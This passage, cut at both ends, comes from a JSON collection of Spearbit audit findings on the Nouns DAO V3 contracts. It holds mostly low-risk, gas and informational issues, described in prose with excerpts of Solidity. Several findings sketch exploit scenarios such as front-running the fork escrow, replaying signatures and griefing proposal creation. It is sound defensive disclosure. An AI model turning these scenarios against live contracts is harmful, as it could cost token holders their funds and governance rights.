        "body": "It has been identified that the private key of privileged (PROPOSER_KEY and DEPLOYER_PRIVATE_KEY) accounts are read the environment variables within scripts. The deployer address is verified on Etherscan as Nouns DAO: Deployer. Additionally, since the proposal is made by the account that owns the PROPOSER_KEY, it can be assumed that the proposer owns at least some Nouns. ProposeENSReverseLookupConfigMain- ProposeDAOV3UpgradeMainnet.s.sol#L24, Given the privileged status of the deployer and the proposer, unauthorized access to this private key could have a negative impact in the reputation of the Nouns DAO. The present method of managing private keys, i.e., through environment variables, represents a potential security risk. This is due to the fact that any program or script with access to the process environment can read these variables. As mentioned in the Foundry documentation: This loads in the private key from our .env file. Note: you must be careful when exposing private keys in a .env file and loading them into programs. This is only recommended for use with non-privileged deployers or for local / test setups. For production setups please review the various wallet options that Foundry supports.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk DeployDAOV3NewContractsBase.s.sol#L53, DeployDAOV3DataContractsBase.s.sol#L21,"
        ]
    },
    {
        "title": "Objection period will be disabled after the update to V3 is completed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Nouns DAO V3 introduces a new functionality called objection-only period. This is a conditional voting period that gets activated upon a last-minute proposal swing from defeated to successful, affording against voters more reaction time. Only against votes will be possible during the objection period. After the proposals created in ProposeDAOV3UpgradeMainnet.s.sol and ProposeTimelockMigrationCleanup- Mainnet.s.sol are executed lastMinuteWindowInBlocks and objectionPeriodDurationInBlocks will still re- main set to 0. A new proposal will have to be created, passed and executed in the DAO that calls the _setLast- MinuteWindowInBlocks() and _setObjectionPeriodDurationInBlocks() functions to enable this functionality.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential risks from outdated OpenZeppelin dependencies in the Nouns DAO v3",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The OpenZeppelion libraries are being used throughout the Nouns DAO v3 codebase. These li- braries however, are locked at version 4.4.0, which is an outdated version that has some known vulnerabilities. Specifically:  The SignatureChecker.isValidSignatureNow is not expected to revert. However, an incorrect assumption about Solidity 0.8's abi.decode allows some cases to revert, given a target contract that doesn't imple- ment EIP-1271 as expected. The contracts that may be affected are those that use SignatureChecker to check the validity of a signature and handle invalid signatures in a way other than reverting.  The ERC165Checker.supportsInterface is designed to always successfully return a boolean, and under no circumstance revert. However, an incorrect assumption about Solidity 0.8's abi.decode allows some cases to revert, given a target contract that doesn't implement EIP-165 as expected, specifically if it returns a value other than 0 or 1. The contracts that may be affected are those that use ERC165Checker to check for support for an interface and then handle the lack of support in a way other than reverting. At present, these vulnerabilities do not appear to have an impact in the Nouns DAO codebase, as corresponding functions revert upon failure. Nevertheless, these vulnerabilities could potentially impact future versions of the codebase.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DAO withdraws forked ids from escrow without emphasizing total supply increase which contra- dicts the spec and can catch holders unaware",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Withdrawal original nouns with ids of the forked tokens from escrow after the successful fork is a material event for all original nouns holders as the adjusted total supply is increased as long as withdrawal recipient is not treasury. There were special considerations regarding Nouns withdrawal impact after the fork: For this reason we're considering a change to make sure transfers go through a new function that helps Nouners ,! understand the implication, e.g. by setting the function name to withdrawNounsAndGrowTotalSupply or something similar, as well as emitting events that indicate the new (and greater) total supply used ,! by the DAO. However, currently withdrawDAONounsFromEscrow() neither have a special name, nor mentions the increase of adjusted total supply when to != ds.timelock:  NounsDAOV3Fork.sol#L160-L178 /** * @notice Withdraws nouns from the fork escrow after the fork has been executed * @dev Only the DAO can call this function * @param tokenIds the tokenIds to withdraw * @param to the address to send the nouns to */ function withdrawDAONounsFromEscrow( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, address to ) external { if (msg.sender != ds.admin) { revert AdminOnly(); } ds.forkEscrow.withdrawTokens(tokenIds, to); emit DAOWithdrawNounsFromEscrow(tokenIds, to); } Nouns holder might not understand the consequences of withdrawing the nouns from escrow and support such a proposal, while as of now it is approximately USD 65k loss per noun withdrawn cumulatively for current holders. The vulnerability scenario here is a holder supporting the proposal without understanding the consequences for supply, as no emphasis is made, and then suffers their share of loss as a result of its execution. Per low likelihood and impact setting the severity to be low.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "USDC-paying proposals executing between ProposeDAOV3UpgradeMainnet and ProposeTimelockMi- grationCleanupMainnet will fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "As explained in one of the Known Issues, ProposeDAOV3UpgradeMainnet contains a proposal that transfers the ownership of PAYER_MAINNET and TOKEN_BUYER_MAINNET from timelockV1 to timelockV2. There could be older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet which assume timelockV1 ownership of these contracts. Older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet will fail.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Zero value ERC-20 transfers can be performed on sending treasury funds to quitting member or forked DAO, denying the whole operation if one of erc20TokensToIncludeInQuit tokens doesn't allow this",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Some tokens do not allow for zero value transfers. Such behaviour do not violate ERC-20 standard, is not anyhow prohibited and can occur in any non-malicious token. As a somewhat well-known example Aave's LEND requires amount to be positive:  etherscan.io/address/0x80fb784b7ed66730e8b1dbd9820afd29931aab03#code#L74 function transfer(address _to, uint256 _value) returns(bool) { require(balances[msg.sender] >= _value); require(balances[_to] + _value > balances[_to]); As stETH, which is currently used by Nouns treasury, is upgradable, it cannot be ruled out that it might be requiring the same in the future for any reason.  etherscan.io/token/0xae7ab96520de3a18e5e111b5eaab095312d7fe84#code Zero value itself can occur in a situation when valid token was added to erc20TokensToIncludeInFork, but this token timelock balance is currently empty. NounsDAOLogicV1Fork's quit() and NounsDAOV3Fork's executeFork() and joinFork() will be unavailable in such scenario, i.e. the DAO forking workflow will be disabled. 37 Since the update of erc20TokensToIncludeInFork goes through proposal mechanics and major tokens rarely upgrade, while there is an additional requirement of empty balance, the cumulative probability of the scenario can be deemed quite low, while the core functionality blocking impact is high, so setting the severity to be low.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A signer of multiple proposals will cause all of them except one to fail creation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Like proposers, signers are also allowed to back only one proposal at a time. As commented: \"This is a spam protection mechanism to limit the number of proposals each noun can back.\" However, unlike proposers who know which of their proposals are active and when, signers may not readily have that insight and can sign multiple proposals they may want to back. If more than one such proposal is proposed then only the first one will pass the checkNoActiveProp() for this signer and all the others will fail this check and thereby the proposal creation itself. A signer of multiple proposals will cause all of them except one to fail creation. Other proposals will have to then exclude such signatures and resubmit. This could be accidental or used by malicious signers for griefing proposal creations.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step ownership change is risky",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The codebase primarily follows a two-step ownership change pattern. However, in specific sections, a single-step ownership change is utilized. Two-step ownership change is preferable, where:  The current owner proposes a new address for the ownership change.  In a separate transaction, the proposed new address can then claim the ownership.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No storage gaps for upgradeable contracts might lead to storage slot collision",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "When implementing upgradable contracts that inherit it is important that there are storage gaps, in case new storage variables are later added to the inherited contracts. If a storage gap variable isn't added, when the upgradable contract introduces new variables, it may override the variables in the inheriting contract. As noted in the OpenZeppelin Documentation: You may notice that every contract includes a state variable named __gap. This is empty reserved It allows us to freely add new state space in storage that is put in place in Upgrade Safe contracts. variables in the future without compromising the storage compatibility with existing deployments. It isnt safe to simply add a state variable because it \"shifts down\" all of the state variables below in the inheritance chain.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The version string is missing from the domain separator allowing submission of signatures in different protocol versions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The version string seems to be missing from the domain separator. According to EIP-712: Protocol designers only need to include the fields that make sense for their signing domain. Unused fields are left out of the struct type While it's not a mandatory field as per the EIP-712 standard, it would be sensible for the protocol to include the version string in the domain separator, considering that the contracts are upgradable. For instance, if a user generates a signature for version v1.0, they may not want the signature to remain valid following an upgrade.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Two/three forks in a row will force expiration of execution-awaiting proposals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Proposal execution on the original DAO is disallowed during the forking period. While the proposed fork period is currently 7 days, MAX_FORK_PERIOD is 14 days. GRACE_PERIOD, which is the time allowed for a queued proposal to execute, has been increased from the existing 14 days to 21 days specifically to account for the fork period. However, if there are three consecutive forks whose active fork periods add up to 21 days, or two forks in the worse case if the fork period is set to MAX_FORK_PERIOD then all queued proposals will expire and cannot be executed. Malicious griefing forkers can collude to time and break-up their voting power to fork consecutively to prevent execution of queued proposal on the original DAO, thus forcing them to expire.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Withdrawing from fork escrow can be front-run to prevent withdrawal and force join the fork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "withdrawFromForkEscrow() is meant to allow a fork escrowed holder change their mind about join- ing the fork by withdrawing their escrowed tokens. However, the current design allows another fork joining holder to front-run a withdrawFromForkEscrow() transaction with their escrowToFork() to exceed the fork threshold and also call executeFork() with it (if the threshold was already met then this doesn't even have to be another fork joining holder). This will cause withdrawFromForkEscrow() to fail because the fork period is now active and that holder is forced to join the fork with their previously escrowed tokens. Scenario: Alice and Bob decide to create/join a fork with their 10 & 15 tokens respectively to meet the 20% fork threshold (assume 100 Nouns). Alice escrows first but then changes her mind and calls withdrawFromForkE- scrow(). Bob observes this transaction (assume no private mempool) and front-runs it with his escrowToFork() + executeFork(). This forces Alice to join the fork instead of staying back. withdrawFromForkEscrow() does not always succeed and is likely effective only in the early stages of escrow period but not towards the end when the fork threshold is almost met. Late fork escrowers do not have as much an opportunity as others to change their mind about joining the fork.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A malicious proposer can replay signatures to create duplicate proposals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Suppose Bob and Alice sign a proposal for Carl, authorizing a transfer of exactly 100,000 USDC to a specified address (xyz) and their signatures were created with a long expiration time. Following the normal procedure, Carl creates the proposal, the vote is held, and the proposal enters the 'succeeded' state. However, since Bob and Alice's signatures are still valid due to the long expiration time, Carl could reuse these signatures to create another proposal for an additional transfer of 100,000 USDC to the same xyz address, as long as Bob and Alice still retain their voting power/nouns. Thus, Carl could double the intended transfer amount without their explicit authorization. While it is true that Bob and Alice can intervene by either cancelling the new proposal or invalidating their signatures before the creation of the second proposal, it necessitates them to take action, which may not always be feasible or timely.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential re-minting of previously burnt NounsTokenFork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of the NounsTokenFork contract, there is a potential vulnerability that allows for a previously burned NounsTokenFork to be re-minted. This risk occurs due to the user retaining the status of escrow.ownerOfEscrowedToken(forkId, nounId) even after the claimFromEscrow() function call. Presently, no tokens are burned outside of the NounsAuctionHouseFork and are only burned in the case that no bids are placed for that nounId. However, this issue could become exploitable under the following circumstances: 1. If a new burn() functionality is added elsewhere in the code. 2. If a new contract is granted the Minter role. 3. If the NounsAuctionHouseFork is updated to a malicious implementation. Additionally, exploiting this potential issue would lead to the remainingTokensToClaim variable decreasing, caus- ing it to underflow (<0). In this situation, some legitimate users would be unable to claim their tokens due to this underflow.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A single invalid/expired/cancelled signature will prevent the creation and updation of proposals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "For proposals created via proposeBySigs() or updated via updateProposalBySigs(), if the pro- poser includes even a single invalid/expired/cancelled signature (without performing offchain checks to prevent this scenario), verifyProposalSignature() will revert and the creation/updation of proposals will fail. NounsDAOV3Proposals.sol#L815 Nouns- A proposer accidentally including one or more invalid/expired/cancelled signatures submitted accidentally by a signer will cause the proposal creation/updation to fail, lose gas used and will have to resubmit after checking and excluding such signatures. This also allows griefing by signers who intentionally submit an invalid/expired signature or a valid one which is later cancelled (using cancelSig()) just before the proposal is created/updated. Note that while the signers currently have cancellation powers which gives them a greater griefing opportunity even at later proposal states, that has been reported separately in a different issue.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk NounsDAOV3Proposals.sol#L956-L962"
        ]
    },
    {
        "title": "Missing require checks in NounsDAOV3Proposals.execute() and executeOnTimelockV1() functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The following require checks are missing:  FunctionNounsDAOV3Proposals.execute(): require(proposal.executeOnTimelockV1 == false, 'NounsDAO::execute: executeOnTimelockV1 = true');  Function NounsDAOV3Proposals.executeOnTimelockV1(): require(proposal.executeOnTimelockV1 == true, 'NounsDAO::executeOnTimelockV1: executeOnTimelockV1 = ,! false'); Due to the absence of these require checks, the NounsDAOLogicV3 contract leaves open a vulnerability where if two identical proposals, with the exact same transactions, are concurrently queued in both the timelockV1 and timelock contracts, the proposal originally intended for execution on timelock can be executed on timelockV1 and vice versa. The consequence of this scenario is that it essentially blocks or causes a Denial of Service to the legitimate execution path of the corresponding proposal for either timelockV1 or timelock. This occurs because each proposal has been inadvertently executed on the unintended timelock contract due to the lack of a condition check that would otherwise ensure the correct execution path.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Due to misaligned DAO and Executors logic any proposal will be blocked from execution at 'eta + GRACE_PERIOD' timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "There is an inconsistency in treatment of the eta + GRACE_PERIOD moment of time in the proposal lifecycle: any proposal is executable in timelock at this timestamp, but have expired status in the DAO logic. Both Executors do allow the executions when block.timestamp == eta + GRACE_PERIOD: The NounsDAOExecutor:executeTransaction() function: 43 function executeTransaction( address target, uint256 value, string memory signature, bytes memory data, uint256 eta ) public returns (bytes memory) { ... require( getBlockTimestamp() >= eta, \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\" ); require( getBlockTimestamp() <= eta + GRACE_PERIOD, 'NounsDAOExecutor::executeTransaction: Transaction is stale.' ); The NounsDAOExecutorV2:executeTransaction() function: function executeTransaction( address target, uint256 value, string memory signature, bytes memory data, uint256 eta ) public returns (bytes memory) { ... require( getBlockTimestamp() >= eta, \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\" ); require( getBlockTimestamp() <= eta + GRACE_PERIOD, 'NounsDAOExecutor::executeTransaction: Transaction is stale.' ); While all (V1,2, 3, and V1Fork) DAO state functions produce the expired state. The NounsDAOLogicV2:state() function: function state(uint256 proposalId) public view returns (ProposalState) { require(proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); Proposal storage proposal = _proposals[proposalId]; if (proposal.vetoed) { return ProposalState.Vetoed; } else if (proposal.canceled) { return ProposalState.Canceled; } else if (block.number <= proposal.startBlock) { return ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return ProposalState.Active; } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < ,! quorumVotes(proposal.id)) { return ProposalState.Defeated; } else if (proposal.eta == 0) { return ProposalState.Succeeded; } else if (proposal.executed) { return ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) { return ProposalState.Expired; 44 The NounsDAOV3Proposals:stateInternal() function: function stateInternal(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) internal view returns (NounsDAOStorageV3.ProposalState) { require(ds.proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId]; if (proposal.vetoed) { return NounsDAOStorageV3.ProposalState.Vetoed; } else if (proposal.canceled) { return NounsDAOStorageV3.ProposalState.Canceled; } else if (block.number <= proposal.updatePeriodEndBlock) { return NounsDAOStorageV3.ProposalState.Updatable; } else if (block.number <= proposal.startBlock) { return NounsDAOStorageV3.ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return NounsDAOStorageV3.ProposalState.Active; } else if (block.number <= proposal.objectionPeriodEndBlock) { return NounsDAOStorageV3.ProposalState.ObjectionPeriod; } else if (isDefeated(ds, proposal)) { return NounsDAOStorageV3.ProposalState.Defeated; } else if (proposal.eta == 0) { return NounsDAOStorageV3.ProposalState.Succeeded; } else if (proposal.executed) { return NounsDAOStorageV3.ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) { return NounsDAOStorageV3.ProposalState.Expired; The NounsDAOLogicV1Fork:state() function: function state(uint256 proposalId) public view returns (ProposalState) { require(proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); Proposal storage proposal = _proposals[proposalId]; if (proposal.canceled) { return ProposalState.Canceled; } else if (block.number <= proposal.startBlock) { return ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return ProposalState.Active; } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < ,! proposal.quorumVotes) { return ProposalState.Defeated; } else if (proposal.eta == 0) { return ProposalState.Succeeded; } else if (proposal.executed) { return ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) { return ProposalState.Expired; Impact: Since both timelocks require sender to be admin, forced to be expired when execution call proposal).GRACE_PERIOD(). the valid proposal will be blocked from execution and time happens to be proposal.eta + getProposalTimelock(ds, The probability of this exact timestamp to be reached is low, while the impact of successful proposal to be rendered invalid by itself is high. However, since there is enough time prior to that moment both for cancellation and execution and all these actions come through permissioned workflow the impact is better described as medium, so per low probability and medium impact setting the severity to be low. 45",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A malicious DAO can increase the odds of proposal defeat by setting a very high value of last- MinuteWindowInBlocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The goal of objection-only period, as documented, is to protect the DAO from executing proposals, that the majority would not want to execute. However, a malicious majority can abuse this feature by setting a very high value of lastMinuteWindowInBlocks (setter does not enforce max threshold), i.e. something very close to the voting period, to increase the probability of triggering objection-only period. If votingPeriod = 2 weeks and a governance proposal somehow passed to set lastMin- Example scenario: uteWindowInBlocks to a value very close to 100800 blocks i.e. ~2 weeks, then every proposal may end up with an objection-only period. Impact: Every proposal may end up with an objection-only period which may not be required/expected. Low likelihood + Low impact = Low severity. 46",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use custom errors instead of revert strings and remove pre-existing unused custom errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "String errors are added to the bytecode which make deployment cost more expenseive. It is also difficult to use dynamic information in them. Custom errors are more convenient and gas-efficient. There are several cases across the codebase where long string errors are still used over custom errors. As an example, in NounsDAOLogicV1Fork.sol#L680, the check reverts with a string: require(msg.sender == admin, 'NounsDAO::_setQuorumVotesBPS: admin only'); In this case, the AdminOnly() custom error can be used here to save gas. This also occur in other parts of this contract as well as the codebase. Also, some custom errors were defined but not used. See NounTokenFork.sol#L40, NounTokenFork.sol#L43",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "escrowedTokensByForkId can be used to get owner of escrowed tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The state variable escrowedTokensByForkId in L58 creates a getter function that can be used to check the owner of escrowed token. This performs the same function as calling ownerOfEscrowedToken() and might be considered redundant.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Emit events using locally assigned variables instead of reading from storage to save on SLOAD",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "By emitting local variables over storage variables, when they have the same value, you can save gas on SLOAD. Some examples include: NounsDAOLogicV1Fork.sol#L619 : - + emit VotingDelaySet(oldVotingDelay, votingDelay); emit VotingDelaySet(oldVotingDelay, newVotingDelay); NounsDAOLogicV1Fork.sol#L635 : - + emit VotingPeriodSet(oldVotingPeriod, votingPeriod); emit VotingPeriodSet(oldVotingPeriod, newVotingPeriod); NounsDAOLogicV1Fork.sol#L653 : - + emit ProposalThresholdBPSSet(oldProposalThresholdBPS, proposalThresholdBPS); emit ProposalThresholdBPSSet(oldProposalThresholdBPS, newProposalThresholdBPS); NounsDAOLogicV1Fork.sol#L670 : - emit QuorumVotesBPSSet(oldQuorumVotesBPS, quorumVotesBPS); + emit QuorumVotesBPSSet(oldQuorumVotesBPS, newQuorumVotesBPS); NounsDAOExecutorV2.sol#L104 : - + emit NewDelay(delay); emit NewDelay(delay_); NounsDAOExecutorV2.sol#L112 : - + emit NewAdmin(admin); emit NewAdmin(msg.sender); NounsDAOExecutorV2.sol#L122 : - + emit NewPendingAdmin(pendingAdmin); emit NewPendingAdmin(pendingAdmin_); NounsDAOV3Admin.sol#L284 : - + emit NewPendingAdmin(oldPendingAdmin, ds.pendingAdmin); emit NewPendingAdmin(oldPendingAdmin, address(0)); NounsDAOProxy.sol#L85 : - + emit NewImplementation(oldImplementation, implementation); emit NewImplementation(oldImplementation, implementation_);",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "joinFork() violates Checks-Effects-Interactions best practice for reentrancy mitigation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "joinFork() interacts with forkDAOTreasury in sendProRataTreasury() to send pro rata original DAO treasury for the tokens joining the fork. This interaction with the external forkDAOTreasury contract happens before the transfer of the original DAO tokens to the timelock is effected. While forkDAOTreasury is under the control of the fork DAO (outside the trust model of original DAO) and join- Fork() does not have a reentrancy guard, we do not see a potential/meaningful exploitable reentrancy here.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename MAX_VOTING_PERIOD and MAX_VOTING_DELAY to enhance readability.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Given that the state variables MAX_VOTING_PERIOD (NounsDAOV3Admin.sol#L115) and MAX_VOT- ING_DELAY (NounsDAOV3Admin.sol#L121) are in blocks, it is more readable if the name has a _BLOCKS suffix and is set to 2 weeks / 12 as done with MAX_OBJECTION_PERIOD_BLOCKS and MAX_UPDATABLE_PERIOD_BLOCKS. The functions, _setVotingDelay (L152) and _setVotingPeriod (L167), can be renamed in the same vain by adding -InBlocks suffix similar to _setObjectionPeriodDurationInBlocks and other functions. In addition to this, constants should be named with all capital letters with underscores separating words, follow- ing the Solidity style guide. For example, proposalMaxOperations in NounsDAOV3Proposals.sol#L138 can be renamed.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "External function is used instead of internal equivalent across NounsDAOV3Proposals logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Public view state(ds, proposalId) is used instead of the fully equivalent internal stateInter- nal(ds, proposalId) in the several occurrences of NounsDAOV3Proposals logic. For example, in the NounsDAOV3Proposals:updateProposalBySigs the state(ds, proposalId) is used instead of the stateInternal function: if (state(ds, proposalId) != NounsDAOStorageV3.ProposalState.Updatable) revert ,! CanOnlyEditUpdatableProposals(); 49",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Proposals created through proposeBySigs() can not be executed on TimelockV1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Currently, proposals created through the proposeBySigs() function can not be executed on Time- lockV1. This could potentially limit the flexibility of creating different types of proposals. It may be advantageous to have a parameter added to the proposeBySigs() function, allowing the proposer to decide whether the proposal should be executed on TimelockV1 or not. There's a design decision to be made regarding whether this value should be incorporated as part of the signers' signature, or simply left up to the proposer to determine if execution should happen on the TimelockV1 or not.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "escrowToFork() can be frontrun to prevent users from joining the fork during the escrow period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "escrowToFork() could be frontrun by another user and make it revert by either: 1. Frontrunning with another escrowToFork() that reaches the fork threshold + executeFork(). 2. If the fork threshold was already reached, frontrunning with executeFork(). This forces the escrowing user to join the fork only during the forking period.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fork spec says Nouns are escrowed during the fork active period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Fork-Spec says: \"During the forking period additional forking Nouns are also sent to the escrow contract; the motivation is to have a clean separation between fork-related Nouns and Nouns owned by the DAO for other reasons.\" However, the implementation sends such Nouns to the original DAO treasury.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Known issues from previous versions/audit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Below are some of the known issues from previous versions as reported by the protocol team, documented in the audit report and is being recorded here verbatim for reporting purposes. Note: All issues reported earlier and not fixed in current version(s) of audit scope are assumed to be acknowledged without fixing. NounsToken delegateBySigs allows delegating to address zero Weve fixed this issue in the fork token contract, but cannot fix it in the original NounsToken because the contract isnt upgradeable. Voting gas refund can be abused Were aware of different ways of abusing this function: A token holder could delegate their Nouns to a contract and vote on multiple proposals in a loop, such that the tx gas overhead is amortized across all votes, while the refund function assumes each vote has the full overhead to bear; this could result in token holders profiting from gas refunds. A token holder could grief the DAO by voting with very long reason strings, in order to drain the refund balance faster. We find these issues low risk and unlikely given the small size of the community, and the low ETH balance the governor contract has to spend on refunds. Should we see such abusive activity, we might reconsider this feature. Nouns transfers will stop working when block number hits uint32 max value Were aware of this issue. It means the Nouns token will stop functioning a long long long time from now :) AuctionHouse has an open gas griefing vector Bidder Alice can bid from a smart contract that returns a large byte array when receiving ETH. Then if Bob outbids Alice, in his bid tx AuctionHouse refunds Alice, and the large return value causes a gas cost spike for Bob. See more details here. Were planning to fix this in the next AuctionHouse version, its launch date is unknown at this point. Using error strings instea of custom errors In all new code were using custom errors. In code thats forked from previous versions we optimized for the smallest diff possible, and so leaving error strings untouched.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "When a minority forks, the majority can follow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "This is a known issue as documented by the protocol team and is being recorded here verbatim for reporting purposes. For example, a malicious majority can vote For a proposal to drain the treasury, forcing others to fork; the majority can then join the fork with many of their tokens, benefiting from the passing proposal on the original DAO, while continuing to attack the minority in their new fork DAO, forcing them to quit the fork DAO. This is a well known flaw of the current fork design, something weve chosen to go live with for the sake of shipping something the DAO has asked for urgently.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "The original DAO can temporarily brick a fork DAOs token minting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "This is a known issue as documented by the protocol team and is being recorded here verbatim for reporting purposes. Weve decided in this version to deploy fork DAOs such that fork tokens reuse the same descriptor contract as the original DAOs token descriptor. Our motivations are minimizing lines of code and the gas cost of deploying a fork. This design poses a risk on fork tokens: the original DAO can update the descriptor to use a new art contract that always reverts, which would then lead to fork tokens mint function always reverting. The solution would be for the fork DAO to execute a proposal that deploys and sets a new descriptor to its token, which would use a valid art contract, allowing minting to resume. The fork DAO is guaranteed to be able to propose and execute such a proposal, because the function where Nouners claim their fork tokens does not use the descriptor, and so is not vulnerable to this attack.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused events, missing events and unindexed event parameters in contracts",
